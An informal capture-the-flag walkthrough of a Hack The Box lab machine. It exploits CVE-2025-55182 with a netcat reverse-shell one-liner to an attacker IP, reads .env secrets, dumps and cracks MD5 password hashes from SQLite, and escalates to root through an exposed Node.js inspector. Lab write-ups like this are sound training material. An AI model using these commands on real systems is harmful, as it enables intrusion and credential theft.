@@ -1,0 +1,157 @@
+Reactor - Active - Easy
+
+Theres a webpage on the scan on port 3000
+after searching with gobuter and burpsuite
+in wapalyzer theres something that called my attention a node.js, after try and try i decided to search for recent CVE's 
+and yeah, there we go, a repo with a CVE CVE-2025-55182
+
+https://www.zscaler.com/mx/blogs/security-research/react2shell-remote-code-execution-vulnerability-cve-2025-55182
+
+and just search for an exploit 
+
+git clone https://github.com/Chocapikk/CVE-2025-55182.git
+
+i use this
+
+and after that 
+
+
+python3 exploit.py -u http://10.129.12.51:3000 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.66 4444 >/tmp/f"
+
+just connect with nc 
+
+nc -lvnp 4444
+
+and simple you got access
+
+then time to upgrade the shell with 
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+and 
+
+stty raw -echo; fg
+export TERM=xterm
+
+
+after searching all the directories 
+
+ls /opt/reactor-app
+cat /opt/reactor-app/.env
+
+this got my attention bc 
+bc why not?
+there were lot of stuff in there so 
+
+�P��C##�Mtablesensor_logssensor_logsCREATE TABLE sensor_logs (
+    id INTEGER PRIMARY KEY,
+    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+    sensor_id TEXT,
+    reading REAL,
+    status TEXT
+)�-�9tableusersusersCREATE TABLE users (
+    id INTEGER PRIMARY KEY,
+    username TEXT NOT NULL,
+    password_hash TEXT NOT NULL,
+    role TEXT NOT NULL,
+    email TEXT
+_��_43%025-12-28 14:32:01COOLANT_FLOW@2ffffffCAUTION33#025-12-28 14:32:01PRESSURE_01@cffffffNOMINAL43%025-12-28 14:32:01CORE_TEMP_01@tHNOMINALnode@reactor:/opt/reactor-app$ 
+node@reactor:/opt/reactor-app$ cat /opt/reactor-app/.env
+# ReactorWatch Configuration
+# Database connection for sensor data
+DB_PATH=/opt/reactor-app/reactor.db
+DB_TYPE=sqlite3
+# API Keys
+SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
+# Node environment
+NODE_ENV=production
+node@reactor:/opt/reactor-app$
+
+and bc its sqlite3 just export all in that format, easy huh? i was searching this shi for an hour, this fckng machine was easy, but not for me man not for me man, not for me 
+
+sqlite3 /opt/reactor-app/reactor.db
+SELECT * FROM users;
+
+easy huh? yeah it was, i just got complicated bc all i practised was old, not new, this shi is new stuff
+
+and i got this 
+
+
+node@reactor:/opt/reactor-app$ sqlite3 /opt/reactor-app/reactor.db
+SQLite version 3.45.1 2024-01-30 16:01:20
+Enter ".help" for usage hints.
+sqlite> SELECT * FROM users;
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+sqlite>
+
+just cracked with md5 hash and ofc admin password was not full text, its not that easy
+but we got the engineer password that was 
+
+reactor1 
+
+https://crackstation.net/
+
+this is the web and yeah, ssh so basically we have free connection
+
+ssh engineer@10.129.12.51 -p 22
+
+
+now the worst part
+
+engineer@reactor:~$ whoami
+engineer
+engineer@reactor:~$ cat user.txt 
+f3df73c92cda93ac9225d8c669dff13d
+engineer@reactor:~$ 
+
+no that no, the privilege escalation, yeah, well i was here like 3 hours more, but i finally achieved
+
+engineer@reactor:~$ ps aux | grep node
+node        1413 10.9  3.5 11813912 139424 ?     Ssl  04:21  17:55 next-server (v15.0.3)
+root        1415  0.0  1.2 1067536 49268 ?       Ssl  04:21   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+node        1727  0.0  0.0   2800  1876 ?        S    05:38   0:00 /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.66 4444 >/tmp/f
+node        1730  0.0  0.0   5828  1884 ?        S    05:38   0:00 cat /tmp/f
+node        1731  0.0  0.0   2800  1812 ?        S    05:38   0:00 sh -i
+node        1732  0.0  0.0   3436  2200 ?        S    05:38   0:00 nc 10.10.14.66 4444
+node        1751  0.0  0.2  18140 10748 ?        S    05:39   0:00 python3 -c import pty;pty.spawn("/bin/bash")
+node        1752  0.0  0.1   8664  5628 pts/0    Ss+  05:39   0:00 /bin/bash
+engineer    2716  0.0  0.0   6544  2288 pts/1    S+   07:05   0:00 grep --color=auto node
+
+
+engineer@reactor:~$ node inspect 127.0.0.1:9229
+
+connecting to 127.0.0.1:9229 ... ok
+debug> exec("process.mainModule.require('child_process').execSync('whoami').toString()")
+'root\n'
+debug> exec("process.mainModule.require('child_process').execSync('cat root/root.txt').toString()")
+'73dde686eb3219858a47d93cca5095ac\n'
+debug> 
+
+basically the root ps aux run command, i dont know how to call it, its running with root, well , root root hahaha and just try using debugers in this case execSynbut we need to inspect the node for this, and well bc its running with root and with the .js file we can execute commands, well no but yeah there it is idk how to explain it 
+i search it too many times 
+
+but basically when using the exec we need to put this command in order to execute well, this was the shittiest part
+
+
+debug> exec("require('child_process').execSync('whoami').toString()")
+
+replace the whoami with the command 
+
+i did not mentioned but bc the user lacked sudo privileges, the process enumeration revealed a root-owned Node.js service running /opt/uptime-monitor/worker.js with the Node.js inspector enabled locally on port 9229. During node inspection enumeration, the local debugging service was confirmed accessible through the built-in node inspect client.
+
+and thats why we use the inspect on local with the 9229 port 
+
+Finally using the debugger’s exec() functionality, arbitrary system commands were executed directly as root. After confirming root-level execution with the id command, the root flag was successfully retrieved from /root/root.txt, completing the full compromise of the Reactor machine.
+
+
+
+
+and pwned heeeelll yeah, that was difficult, my mind its broke, i dont want to do anything but to sleep
+this machine for me, an apprentice level 18 in htb was quite brainfck with no ai ;)
+no more documentation, i need to sleep 
+i didnt want to go until i finish it ;(
+
+first crash out
+PWNED ;)
